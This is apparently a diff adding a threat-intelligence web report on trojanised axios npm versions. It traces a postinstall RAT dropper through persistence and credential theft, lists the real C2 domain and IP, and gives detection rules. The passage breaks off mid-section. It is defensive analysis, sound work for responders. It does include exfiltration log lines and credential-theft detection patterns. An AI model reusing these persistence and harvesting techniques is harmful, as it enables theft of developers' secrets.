@@ -1,0 +1,1281 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Axios npm Supply Chain RAT | TI-DE</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='36' y2='36' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0%25' stop-color='%23e85d04'/%3E%3Cstop offset='100%25' stop-color='%23f48c06'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M18 2L4 7v10c0 8.5 5.9 16.4 14 18.5C26.1 33.4 32 25.5 32 17V7L18 2Z' fill='url(%23g)' opacity='.9'/%3E%3Ccircle cx='18' cy='18' r='6' stroke='%23fff' stroke-width='1.2' fill='none' opacity='.7'/%3E%3Ccircle cx='18' cy='18' r='2.5' fill='%23fff' opacity='.9'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../../assets/report.css" />
+</head>
+<body>
+
+<!-- BACK BAR -->
+<div class="back-bar">
+  <a href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <span class="sep">/</span>
+  <a href="https://mazlumbaydar.github.io/TI-DE/">Reports</a>
+  <span class="sep">/</span>
+  <span class="current">Axios npm Supply Chain RAT Dropper</span>
+</div>
+
+<div id="prog"></div>
+
+<!-- NAVBAR -->
+<nav id="nav">
+  <a class="nav-brand" href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <ul class="nav-links">
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#attack-chain">Attack</a></li>
+    <li><a href="#simulation">Simulation</a></li>
+    <li><a href="#timeline">Timeline</a></li>
+    <li><a href="#iocs">IOCs</a></li>
+    <li><a href="#detection">Detection</a></li>
+    <li><a href="#recommendations">Response</a></li>
+  </ul>
+  <div class="nav-controls">
+    <button class="nav-ctrl" id="langBtn" onclick="toggleLang()" title="Toggle language">🌐 EN</button>
+    <button class="nav-ctrl" id="themeBtn" onclick="toggleTheme()" title="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="badge-sev critical">
+    <span class="live-dot"></span>
+    CRITICAL &mdash; npm Supply Chain &mdash; RAT Dropper &mdash; 31 March 2026
+  </div>
+  <h1 class="hero-title" id="heroTitle">Axios npm Supply Chain<br>/ RAT Dropper</h1>
+  <p class="hero-sub" id="heroSub">Malicious axios@1.14.1 and @0.30.4 deliver cross-platform Remote Access Trojan via XOR-obfuscated postinstall hooks. C2 beacon using fake IE8 User-Agent.</p>
+  <div class="meta-strip">
+    <div class="meta-chip">Date: <span>31 March 2026</span></div>
+    <div class="meta-chip">Packages: <span>axios@1.14.1 / @0.30.4</span></div>
+    <div class="meta-chip">Targets: <span>Windows / Linux / macOS</span></div>
+    <div class="meta-chip">Status: <span style="color:var(--green);font-weight:700">Packages Removed</span></div>
+    <div class="meta-chip">C2: <span style="color:var(--red)">sfrclak.com</span></div>
+  </div>
+</section>
+
+<main>
+
+  <!-- ══ OVERVIEW / STATS ══ -->
+  <div class="stat-grid reveal" id="overview">
+    <div class="stat-card">
+      <div class="stat-num" data-t="2">0</div>
+      <div class="stat-label" id="sl0">Malicious Versions</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="3">0</div>
+      <div class="stat-label" id="sl1">OS Targets</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="8">0</div>
+      <div class="stat-label" id="sl2">MITRE TTPs</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="11">0</div>
+      <div class="stat-label" id="sl3">Detection Platforms</div>
+    </div>
+  </div>
+
+  <!-- ══ BACKGROUND ══ -->
+  <div class="reveal" id="background">
+    <div class="section-label" id="bgLabel">Background</div>
+    <h2 id="bgTitle">What Happened</h2>
+
+    <p id="bgP1">On 31 March 2026, two malicious versions of the <strong>axios</strong> npm package were identified: <strong>axios@1.14.1</strong> and <strong>axios@0.30.4</strong>. The legitimate axios version line is <strong>1.7.x</strong> &mdash; version 1.14.1 has never existed in the official package, making it an immediate red flag for version-aware teams.</p>
+
+    <p id="bgP2">Both packages contained a <code>postinstall</code> hook in <code>package.json</code> pointing to <code>node ./scripts/install.js</code>. The <code>install.js</code> file used XOR obfuscation to conceal C2 URLs and binary download logic. Upon execution, it detected the host operating system and downloaded a platform-specific RAT binary from <code>sfrclak.com</code>.</p>
+
+    <p id="bgP3">The RAT deployed differently per platform: on <strong>Windows</strong> it placed an <code>.exe</code> in <code>%TEMP%\</code> and installed a scheduled task named <em>"WindowsUpdate"</em>; on <strong>Linux / macOS</strong> it wrote an ELF or Mach-O binary to <code>~/.local/bin/</code> and created a crontab entry running every 5 minutes. All variants beaconed to <code>sfrclak.com:8000</code> using a fake Internet Explorer 8 User-Agent string (<code>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</code>) &mdash; an impossible string on any modern system, making it a zero-false-positive detection signal.</p>
+
+    <div class="warn-box" id="bgWarn">
+      <strong>If you have axios@1.14.1 or axios@0.30.4 installed, uninstall immediately and treat the host as compromised.</strong> Run <code>npm list axios</code> to check all workstations and CI/CD environments.
+    </div>
+
+    <div class="detail-grid">
+      <div class="detail-card">
+        <div class="detail-card-title" id="ddTitle1">Attack Details</div>
+        <div class="detail-row"><div class="detail-key">Date</div><div class="detail-val">31 March 2026</div></div>
+        <div class="detail-row"><div class="detail-key">Hook</div><div class="detail-val"><code>postinstall → node ./scripts/install.js</code></div></div>
+        <div class="detail-row"><div class="detail-key">Obfuscation</div><div class="detail-val">XOR single-byte key</div></div>
+        <div class="detail-row"><div class="detail-key">C2 Domain</div><div class="detail-val" style="color:var(--red)">sfrclak.com:8000</div></div>
+        <div class="detail-row"><div class="detail-key">C2 IP</div><div class="detail-val" style="color:var(--red)">142.11.206.73</div></div>
+        <div class="detail-row"><div class="detail-key">User-Agent</div><div class="detail-val"><code>MSIE 8.0 / Trident/4.0</code></div></div>
+        <div class="detail-row"><div class="detail-key">RAT Type</div><div class="detail-val">Cross-platform native binary</div></div>
+      </div>
+      <div class="detail-card">
+        <div class="detail-card-title" id="ddTitle2">Package Details</div>
+        <div class="detail-row"><div class="detail-key">Package 1</div><div class="detail-val" style="color:var(--red)">axios@1.14.1</div></div>
+        <div class="detail-row"><div class="detail-key">Package 2</div><div class="detail-val" style="color:var(--red)">axios@0.30.4</div></div>
+        <div class="detail-row"><div class="detail-key">Legit Line</div><div class="detail-val" style="color:var(--green)">1.7.x (latest)</div></div>
+        <div class="detail-row"><div class="detail-key">Win Payload</div><div class="detail-val"><code>%TEMP%\*.exe</code> + schtask</div></div>
+        <div class="detail-row"><div class="detail-key">Lin/Mac Payload</div><div class="detail-val"><code>~/.local/bin/</code> + crontab</div></div>
+        <div class="detail-row"><div class="detail-key">Persistence</div><div class="detail-val">Every 5 minutes</div></div>
+        <div class="detail-row"><div class="detail-key">Status</div><div class="detail-val" style="color:var(--green)">Packages Removed</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ ATTACK CHAIN ══ -->
+  <div class="reveal" id="attack-chain">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" id="acLabel">Attack Flow</div>
+    <h2 id="acTitle">Attack Chain &mdash; 5 Steps</h2>
+
+    <div class="chain-container" id="chainSteps">
+
+      <div class="chain-step" style="--delay:0s">
+        <div class="chain-icon" style="border-color:var(--accent);color:var(--accent)">&#127917;</div>
+        <div class="chain-content">
+          <div class="chain-title" id="cs1t">Step 1 &mdash; Package Publishing</div>
+          <div class="chain-desc" id="cs1d">Threat actor publishes axios@1.14.1 and axios@0.30.4 to npm. Uses version numbers that don't exist in legitimate axios (real versions are 1.7.x). Package contains malicious <code>scripts/install.js</code> and XOR-encoded payload. The inflated version number (1.14.1 &gt; 1.7.x) can fool automated dependency update tools.</div>
+          <span class="chain-ttp">T1195.001 &mdash; Compromise Software Dependencies and Development Tools</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent2);color:var(--accent2)">&#128230;</div>
+        <div class="chain-content">
+          <div class="chain-title" id="cs2t">Step 2 &mdash; npm install / Hook Triggered</div>
+          <div class="chain-desc" id="cs2d">Developer or CI/CD pipeline runs <code>npm install</code>. npm automatically runs postinstall scripts. <code>install.js</code> executes with full Node.js capabilities &mdash; no user prompt, no warning, no permission check. The user sees only normal install output while the RAT dropper runs silently.</div>
+          <span class="chain-ttp">T1059.007 &mdash; JavaScript</span>
+          <span class="chain-ttp" style="margin-left:4px">T1195.001</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent3);color:var(--accent3)">&#128187;</div>
+        <div class="chain-content">
+          <div class="chain-title" id="cs3t">Step 3 &mdash; OS Fingerprinting + Binary Download</div>
+          <div class="chain-desc" id="cs3d"><code>install.js</code> checks <code>process.platform</code>. Downloads OS-specific RAT binary from <code>sfrclak.com</code> via HTTPS. XOR-decodes the payload on-disk before execution. Binary is platform-native: <code>.exe</code> (Windows), ELF (Linux), Mach-O (macOS). The HTTPS download uses the system's CA store and looks like normal package telemetry.</div>
+          <span class="chain-ttp">T1059.007 &mdash; JavaScript</span>
+          <span class="chain-ttp" style="margin-left:4px">T1140 &mdash; Deobfuscate/Decode Files</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:#a8dadc;color:#a8dadc">&#128257;</div>
+        <div class="chain-content">
+          <div class="chain-title" id="cs4t">Step 4 &mdash; Persistence Installation</div>
+          <div class="chain-desc" id="cs4d"><strong>Windows:</strong> scheduled task named <em>"WindowsUpdate"</em> running every 5 minutes &mdash; deliberately chosen to blend with Microsoft's legitimate Windows Update tasks. <strong>Linux/macOS:</strong> crontab entry (<code>*/5 * * * *</code>) for the current user. RAT process is renamed to mimic a legitimate system utility name in process listings.</div>
+          <span class="chain-ttp">T1053.005 &mdash; Scheduled Task</span>
+          <span class="chain-ttp" style="margin-left:4px">T1053.003 &mdash; Cron</span>
+          <span class="chain-ttp" style="margin-left:4px">T1036 &mdash; Masquerading</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--red);color:var(--red)">&#128225;</div>
+        <div class="chain-content">
+          <div class="chain-title" id="cs5t">Step 5 &mdash; RAT C2 Beacon + Data Theft</div>
+          <div class="chain-desc" id="cs5d">RAT connects to <code>sfrclak.com:8000</code> using fake MSIE 8.0 User-Agent &mdash; an IE8 string from 2009, impossible on any modern system. Exfiltrates environment variables, SSH keys (<code>~/.ssh/id_rsa</code>), <code>.npmrc</code> auth tokens, and git credentials. Attacker gains persistent remote access to the developer's machine and potentially the entire organization's infrastructure.</div>
+          <span class="chain-ttp">T1071.001 &mdash; Web Protocols</span>
+          <span class="chain-ttp" style="margin-left:4px">T1001 &mdash; Data Obfuscation</span>
+          <span class="chain-ttp" style="margin-left:4px">T1552.001</span>
+          <span class="chain-ttp" style="margin-left:4px">T1041 &mdash; Exfiltration over C2</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ SIMULATION ══ -->
+  <div class="reveal" id="simulation">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" id="simLabel">Live Attack Simulation</div>
+    <h2 id="simTitle">Attack Flow &mdash; Step-by-Step Visualization</h2>
+    <p id="simDesc">Follow the axios npm RAT dropper chain from malicious package publication through OS-specific binary deployment and C2 beacon. Click nodes or dots to jump to any step.</p>
+
+    <div class="atk-viz">
+      <div class="atk-viz-top">
+        <div>
+          <div class="section-label" style="margin:0 0 4px">Attack Flow</div>
+          <div style="font-size:0.82rem;color:var(--muted)">axios npm Supply Chain &rarr; postinstall &rarr; XOR RAT &rarr; Persistence &rarr; C2</div>
+        </div>
+        <div class="atk-btns">
+          <button class="atk-play step-btn" id="atkStepBtn" onclick="atvGoTo(_atvIdx+1)">STEP &rarr;</button>
+          <button class="atk-play" id="atkPlayBtn" onclick="atvRun()">&#9654; AUTO</button>
+        </div>
+      </div>
+
+      <div class="atk-pipeline">
+        <!-- Node 0: Threat Actor -->
+        <div class="atk-node" id="vn0" onclick="atvGoTo(0)" title="Step 1">
+          <div class="atk-node-box">&#127917;</div>
+          <div class="atk-node-label">Threat<br>Actor</div>
+        </div>
+        <!-- Connector 0 -->
+        <div class="atk-connector" id="vc0">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt orange"></div>
+        </div>
+        <!-- Node 1: npm Registry -->
+        <div class="atk-node" id="vn1" onclick="atvGoTo(1)" title="Step 2">
+          <div class="atk-node-box">&#128230;</div>
+          <div class="atk-node-label">npm<br>Registry</div>
+        </div>
+        <!-- Connector 1 -->
+        <div class="atk-connector" id="vc1">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt orange"></div>
+        </div>
+        <!-- Node 2: Dev Machine -->
+        <div class="atk-node" id="vn2" onclick="atvGoTo(2)" title="Step 3">
+          <div class="atk-node-box">&#128187;</div>
+          <div class="atk-node-label">Dev<br>Machine</div>
+        </div>
+        <!-- Connector 2 -->
+        <div class="atk-connector" id="vc2">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <!-- Node 3: RAT Process -->
+        <div class="atk-node" id="vn3" onclick="atvGoTo(3)" title="Step 4">
+          <div class="atk-node-box">&#128027;</div>
+          <div class="atk-node-label">RAT<br>Process</div>
+        </div>
+        <!-- Connector 3 -->
+        <div class="atk-connector" id="vc3">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <!-- Node 4: C2 -->
+        <div class="atk-node" id="vn4" onclick="atvGoTo(4)" title="Step 5">
+          <div class="atk-node-box">&#128225;</div>
+          <div class="atk-node-label">C2<br>(sfrclak.com)</div>
+        </div>
+      </div>
+
+      <div class="atk-detail" id="atkDetail">
+        <div class="atk-detail-step" id="atkDetailStep">&#9654; SIMULATION READY</div>
+        <div class="atk-detail-text" id="atkDetailText">Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step.</div>
+      </div>
+
+      <div class="atk-explain" id="atkExplain" style="display:none">
+        <div class="atk-explain-label">Analyst Note</div>
+        <div id="atkExplainText"></div>
+      </div>
+
+      <div class="atk-progress">
+        <div class="atk-dot" onclick="atvGoTo(0)"></div>
+        <div class="atk-dot" onclick="atvGoTo(1)"></div>
+        <div class="atk-dot" onclick="atvGoTo(2)"></div>
+        <div class="atk-dot" onclick="atvGoTo(3)"></div>
+        <div class="atk-dot" onclick="atvGoTo(4)"></div>
+        <span class="atk-prog-label" id="atkProgLabel">0 / 5</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ MITRE TIMELINE ══ -->
+  <div class="reveal" id="timeline">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" id="tlLabel">Threat Intelligence</div>
+    <h2 id="tlTitle">MITRE ATT&amp;CK Timeline</h2>
+
+    <div class="mtt">
+
+      <div class="mtt-item">
+        <div class="mtt-tactic">Initial Access</div>
+        <div class="mtt-technique-title">Supply Chain Compromise via Malicious npm Package</div>
+        <div class="mtt-tids">
+          <span class="mtt-tid">T1195.001</span>
+        </div>
+        <div class="mtt-desc"><strong>Technique:</strong> Compromise Software Dependencies and Development Tools. Threat actor publishes axios@1.14.1 and @0.30.4 &mdash; version numbers that never existed in legitimate axios (real: 1.7.x). Any <code>npm install axios</code> without pinned integrity check pulls the malicious build.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title">Evidence Artifacts</span>
+            <span class="mtt-evidence-src">npm / package-lock.json</span>
+          </div>
+          <div class="mtt-evidence-body">npm audit output showing axios@1.14.1
+package-lock.json — "resolved": "...axios/-/axios-1.14.1.tgz"
+timestamp of npm install execution in CI logs</div>
+        </div>
+        <div class="mtt-annotation"><strong>Detection Note:</strong> "npm version 1.14.1 doesn't exist in legitimate axios &mdash; version check catches this." Run <code>npm view axios versions</code> to verify any suspicious version number.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic">Execution</div>
+        <div class="mtt-technique-title">JavaScript Postinstall Hook &mdash; Automatic Execution on npm install</div>
+        <div class="mtt-tids">
+          <span class="mtt-tid">T1059.007</span>
+        </div>
+        <div class="mtt-desc"><strong>Technique:</strong> Command and Scripting Interpreter: JavaScript. The <code>postinstall</code> hook in <code>package.json</code> runs <code>node ./scripts/install.js</code> automatically when npm resolves the dependency. No user interaction beyond <code>npm install</code> is required &mdash; the hook fires silently.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title">Evidence Artifacts</span>
+            <span class="mtt-evidence-src">npm verbose log / process tree</span>
+          </div>
+          <div class="mtt-evidence-body">npm verbose log showing: "> axios@1.14.1 postinstall"
+                                         "> node ./scripts/install.js"
+node.exe spawned by npm.cmd — parent-child process tree
+network connection from node.exe to sfrclak.com within 3s of install</div>
+        </div>
+        <div class="mtt-annotation"><strong>Detection Note:</strong> "postinstall script runs immediately on npm install &mdash; no additional user action needed." Flag any <code>node.exe</code> making outbound connections during <code>npm install</code> to non-registry hosts.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic">Defense Evasion</div>
+        <div class="mtt-technique-title">Triple Evasion: XOR Obfuscation + Process Masquerade + Antique UA</div>
+        <div class="mtt-tids">
+          <span class="mtt-tid">T1140</span>
+          <span class="mtt-tid">T1036</span>
+          <span class="mtt-tid">T1001</span>
+        </div>
+        <div class="mtt-desc"><strong>T1140:</strong> XOR decoding of payload URLs and binary content on-disk defeats simple string-based YARA/AV signatures. <strong>T1036:</strong> RAT binary renamed to mimic system utilities (<em>svchost_update.exe</em> on Windows, <em>update</em> on Linux). <strong>T1001:</strong> MSIE 8.0 User-Agent in C2 traffic disguises beacon as legacy browser activity.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title">Evidence Artifacts</span>
+            <span class="mtt-evidence-src">Proxy logs / filesystem / memory</span>
+          </div>
+          <div class="mtt-evidence-body">XOR-decoded binary written to %TEMP%\svchost_update.exe
+process renamed to system utility name in tasklist/ps output
+MSIE 8.0 UA string in proxy/firewall logs:
+  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"</div>
+        </div>
+        <div class="mtt-annotation"><strong>Detection Note:</strong> "Triple evasion: XOR on download, system name masquerade, antique UA string for C2 traffic." The MSIE 8.0 UA is a <strong>zero-false-positive</strong> signal &mdash; no modern application legitimately sends this string.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic">Persistence</div>
+        <div class="mtt-technique-title">Scheduled Task (Windows) + Cron Job (Linux/macOS)</div>
+        <div class="mtt-tids">
+          <span class="mtt-tid">T1053.005</span>
+          <span class="mtt-tid">T1053.003</span>
+        </div>
+        <div class="mtt-desc"><strong>T1053.005:</strong> Scheduled task named <em>"WindowsUpdate"</em> created via <code>schtasks /create</code> running every 5 minutes, deliberately chosen to blend with Microsoft's legitimate Windows Update task. <strong>T1053.003:</strong> <code>crontab</code> entry added for the current user on Linux/macOS with <code>*/5 * * * *</code> frequency. Both mechanisms survive reboots and are installed without admin/root privileges.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title">Evidence Artifacts</span>
+            <span class="mtt-evidence-src">schtasks / crontab / Windows Event Log 4698</span>
+          </div>
+          <div class="mtt-evidence-body">Windows:
+  schtasks /query /tn "WindowsUpdate" → task pointing to %TEMP%\svchost_update.exe
+  Event ID 4698 — Task created by node.exe (NOT by Microsoft)
+
+Linux/macOS:
+  crontab -l → "*/5 * * * * ~/.local/bin/update"
+  process restart observed after manual kill</div>
+        </div>
+        <div class="mtt-annotation"><strong>Detection Note:</strong> "Task named WindowsUpdate: deliberate confusion with Microsoft's legitimate task name." Alert on <strong>WindowsUpdate</strong> scheduled task where the author is NOT <code>NT AUTHORITY\SYSTEM</code> or a Microsoft process.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic">Collection + Exfiltration</div>
+        <div class="mtt-technique-title">Credential Harvest + C2 Exfiltration over HTTP</div>
+        <div class="mtt-tids">
+          <span class="mtt-tid">T1552.001</span>
+          <span class="mtt-tid">T1005</span>
+          <span class="mtt-tid">T1041</span>
+          <span class="mtt-tid">T1071.001</span>
+        </div>
+        <div class="mtt-desc"><strong>T1552.001:</strong> SSH private keys (<code>~/.ssh/id_rsa</code>), npm auth tokens (<code>~/.npmrc</code>), git credentials (<code>~/.gitconfig</code>), and environment variables containing <code>TOKEN</code>, <code>KEY</code>, <code>SECRET</code>, or <code>PASS</code> are harvested. <strong>T1041:</strong> All data exfiltrated to <code>sfrclak.com:8000</code> via HTTP POST, with beacon traffic disguised using MSIE 8.0 UA (<strong>T1071.001</strong>).</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title">Evidence Artifacts</span>
+            <span class="mtt-evidence-src">File access audit / proxy logs / SIEM</span>
+          </div>
+          <div class="mtt-evidence-body">~/.ssh/id_rsa read by non-ssh process (high-priority alert)
+~/.npmrc read by RAT binary
+HTTP GET sfrclak.com:8000/api/status — MSIE 8.0 UA
+HTTP POST sfrclak.com:8000/api/data — large body (credentials)
+DNS query: sfrclak.com resolved to 142.11.206.73</div>
+        </div>
+        <div class="mtt-annotation"><strong>Detection Note:</strong> "SSH key access by non-ssh process is zero-FP on developer machines &mdash; highest priority alert." Create an alert for any process reading <code>~/.ssh/id_rsa</code> where <code>process.name != ssh</code> and <code>process.name != gpg-agent</code>.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ IOCs ══ -->
+  <div class="reveal" id="iocs">
+    <div class="section-label" id="iocLabel">Threat Intelligence</div>
+    <h2 id="iocTitle">Indicators of Compromise</h2>
+    <p id="iocDesc">Confirmed axios RAT dropper infrastructure. TTP-based detection rules in the section below do NOT rely on these IOCs &mdash; they remain effective after infrastructure rotation.</p>
+    <div class="ioc-scroll">
+      <table class="ioc-table">
+        <thead>
+          <tr>
+            <th>IOC</th>
+            <th>Type</th>
+            <th>Confidence</th>
+            <th>VirusTotal</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code class="ioc-val">sfrclak.com</code></td>
+            <td><span class="ioc-type">Domain</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/domain/sfrclak.com" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">142.11.206.73</code></td>
+            <td><span class="ioc-type">IP</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/ip-address/142.11.206.73" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">axios@1.14.1</code></td>
+            <td><span class="ioc-type">npm Package</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td>&mdash;</td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">axios@0.30.4</code></td>
+            <td><span class="ioc-type">npm Package</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td>&mdash;</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ══ DETECTION ══ -->
+  <div class="reveal" id="detection">
+    <div class="team-label team-blue">&#128309; Blue Team</div>
+    <div class="section-label" id="detLabel">Detection Engineering</div>
+    <h2 id="detTitle">Detection Rules &mdash; 11 Platforms</h2>
+    <p id="detDesc">All rules are <strong>TTP-based and behavioral</strong>. SIEM rules detect anomalous node.js network behavior and MSIE 8.0 UA. EDR/XDR rules catch runtime process-level indicators. The YARA rule covers both infrastructure-specific and behavioral patterns.</p>
+
+    <!-- SIEM GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-siem">SIEM</span>
+        <span class="rule-group-label">Rules 1&ndash;4: Sigma / Sentinel KQL / Splunk SPL / QRadar AQL</span>
+      </div>
+
+      <!-- Rule 1: Sigma -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Sigma</span>
+            Axios npm Malicious Postinstall &mdash; Shell from Node
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sigma-axios-npm-postinstall.yml &mdash; T1195.001 / T1059.007
+            </div>
+            <div class="code-body"><span class="kw">title</span>: Malicious npm Postinstall &mdash; Unauthorized Network Connection from Node.js
+<span class="kw">id</span>: 4d6e8f0a-3b5c-7d9e-1f3a-5b7c9d1e3f5a
+<span class="kw">status</span>: experimental
+<span class="kw">description</span>: Detects node.js making outbound connections to non-registry hosts
+           during npm install &mdash; supply chain RAT indicator
+<span class="kw">author</span>: TI-DE
+<span class="kw">date</span>: <span class="num">2026/03/31</span>
+<span class="kw">tags</span>:
+  - attack.initial_access
+  - attack.t1195.001
+  - attack.execution
+  - attack.t1059.007
+<span class="kw">logsource</span>:
+  category: network_connection
+  product: linux
+<span class="kw">detection</span>:
+  selection:
+    Image|endswith: <span class="str">'/node'</span>
+    ParentImage|contains: <span class="str">'npm'</span>
+    Initiated: <span class="str">'true'</span>
+  filter_legitimate:
+    DestinationHostname|endswith:
+      - <span class="str">'registry.npmjs.org'</span>
+      - <span class="str">'registry.yarnpkg.com'</span>
+  condition: selection and not filter_legitimate
+<span class="kw">falsepositives</span>:
+  - Postinstall scripts that legitimately call external APIs
+<span class="kw">level</span>: medium</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 2: Sentinel KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Microsoft Sentinel KQL</span>
+            MSIE 8.0 User-Agent from Internal Host
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sentinel-msie8-ua.kql &mdash; T1001 / T1071.001
+            </div>
+            <div class="code-body"><span class="cmt">// Proxy/firewall logs &mdash; MSIE 8.0 UA is impossible on modern systems</span>
+<span class="fn">W3CIISLog</span>
+| <span class="kw">where</span> csUserAgent <span class="kw">contains</span> <span class="str">"MSIE 8.0"</span> <span class="kw">or</span> csUserAgent <span class="kw">contains</span> <span class="str">"Trident/4.0"</span>
+| <span class="kw">where not</span>(<span class="fn">ipv4_is_private</span>(cIP))
+| <span class="fn">summarize</span> count() <span class="kw">by</span> cIP, csHost, csUserAgent, <span class="fn">bin</span>(TimeGenerated, 5m)
+| <span class="fn">extend</span> Severity = <span class="str">"High"</span>, TTP = <span class="str">"T1001 - Data Obfuscation (UA Masquerade)"</span>
+| <span class="kw">where</span> count_ >= <span class="num">1</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 3: Splunk SPL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Splunk SPL</span>
+            Windows Scheduled Task Created by Node Process
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              splunk-schtask-from-node.spl &mdash; T1053.005
+            </div>
+            <div class="code-body"><span class="fn">index</span>=endpoint <span class="kw">sourcetype</span>=wineventlog EventCode=<span class="num">4698</span>
+| <span class="kw">where</span> <span class="fn">like</span>(TaskContent, <span class="str">"%schtasks%"</span>) OR <span class="fn">like</span>(TaskAction, <span class="str">"%TEMP%"</span>)
+| <span class="kw">where</span> <span class="fn">like</span>(<span class="fn">lower</span>(TaskName), <span class="str">"%windowsupdate%"</span>) AND NOT <span class="fn">like</span>(TaskAuthor, <span class="str">"%Microsoft%"</span>)
+| <span class="fn">table</span> _time, ComputerName, TaskName, TaskAction, TaskAuthor, SubjectUserName
+| <span class="fn">eval</span> ttp=<span class="str">"T1053.005 - Scheduled Task"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 4: QRadar AQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">QRadar AQL</span>
+            C2 Communication to Axios RAT Infrastructure
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
